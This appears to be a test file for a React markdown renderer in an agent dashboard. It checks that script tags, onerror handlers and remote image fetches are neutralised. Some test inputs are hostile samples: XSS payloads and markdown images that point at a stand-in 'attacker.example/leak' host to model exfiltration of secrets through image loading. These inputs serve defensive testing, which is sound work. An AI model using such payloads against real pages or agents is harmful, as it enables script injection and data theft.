import { expect, test } from "bun:test";
import { renderToStaticMarkup } from "react-dom/server";
import { DashboardContext, type DashboardContextValue } from "./dashboard-context";
import { FileBaseContext } from "./file-link";
import { MessageMarkdown } from "./message-markdown";

test("messages render GFM and refuse executable markup", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown text={'# Report\n\n- [x] done\n\n| Key | Value |\n| --- | --- |\n| answer | 42 |\n\n```ts\nconst answer = 42\n```\n\n[link](https://example.com) <script>alert(1)</script>'} />,
	);
	expect(html).toContain("<h1>Report</h1>");
	expect(html).toContain('type="checkbox" disabled="" checked=""');
	expect(html).toContain("<table>");
	expect(html).toContain("hljs-keyword");
	expect(html).toContain('target="_blank" rel="noopener noreferrer"');
	expect(html).not.toContain("<script>");
	expect(html).not.toContain('node="[object Object]"');
});

test("unfinished streaming fences remain code blocks", () => {
	const html = renderToStaticMarkup(<MessageMarkdown text={"Before\n\n```ts\nconst answer = 42"} />);
	expect(html).toContain("<pre>");
	expect(html).toContain("hljs-keyword");
	expect(html).toContain("answer");
});

test("GitHub text renders the HTML GitHub allows, hides comments, and still refuses executable markup", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown
			github
			text={'<!-- CURSOR_SUMMARY -->\n<details><summary>More</summary>\n\nHidden **bold**\n\n</details>\n\n<img src="x" onerror="alert(1)"> <script>alert(1)</script>\n\n```ts\nconst answer = 42\n```'}
		/>,
	);
	expect(html).toContain("<details><summary>More</summary>");
	expect(html).toContain("<strong>bold</strong>");
	expect(html).toContain("hljs-keyword");
	expect(html).not.toContain("CURSOR_SUMMARY");
	expect(html).not.toContain("onerror");
	expect(html).not.toContain("<script>");
});

test("agent text links remote images rather than fetching them, but can show inline data images", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown text={'![secret](https://attacker.example/leak?q=key) ![logo](data:image/png;base64,aGVsbG8=)'} />,
	);
	expect(html).not.toContain('<img src="https://attacker.example');
	expect(html).toContain('<a href="https://attacker.example/leak?q=key"');
	expect(html).toContain('<img src="data:image/png;base64,aGVsbG8="');
});

test("GitHub text shows only GitHub-hosted images and links other image URLs", () => {
	const html = renderToStaticMarkup(
		<MessageMarkdown github text={'![avatar](https://avatars.githubusercontent.com/u/1?v=4) <img src="https://github.com/user-attachments/assets/123" alt="attachment"> ![other](https://attacker.example/leak)'} />,
	);
	expect(html).toContain('<img src="https://avatars.githubusercontent.com/u/1?v=4"');
	expect(html).toContain('<img src="https://github.com/user-attachments/assets/123"');
	expect(html).not.toContain('<img src="https://attacker.example');
	expect(html).toContain('<a href="https://attacker.example/leak"');
});

const fileLinks = (text: string, base: string | null): { html: string; count: number } => {
	const html = renderToStaticMarkup(
		<DashboardContext.Provider value={{ openFile: () => {} } as unknown as DashboardContextValue}>
			<FileBaseContext.Provider value={base}>
				<MessageMarkdown text={text} />
			</FileBaseContext.Provider>
		</DashboardContext.Provider>,
	);
	return { html, count: html.match(/class="file-link"/g)?.length ?? 0 };
};

test("agent text opens text file paths in the file dialog, not web addresses or other files", () => {
	const { html, count } = fileLinks(
		"Wrote /tmp/omp-token-decision.tsv and `docs/usage.md:12`, see [plan](file:///tmp/plan.md), https://example.com/readme.md, `src/app.ts`, and /tmp/shot.png.",
		"/repo",
	);
	expect(count).toBe(3);
	expect(html).toContain('<a href="https://example.com/readme.md"');
	expect(html).toContain("<code>src/app.ts</code>");
});

test("a relative file path opens only where a session directory resolves it, and code blocks stay code", () => {
	expect(fileLinks("`docs/usage.md` and ~/notes.md", null).count).toBe(1);
	expect(fileLinks("```\n/tmp/notes.md\n```", "/repo").count).toBe(0);
});
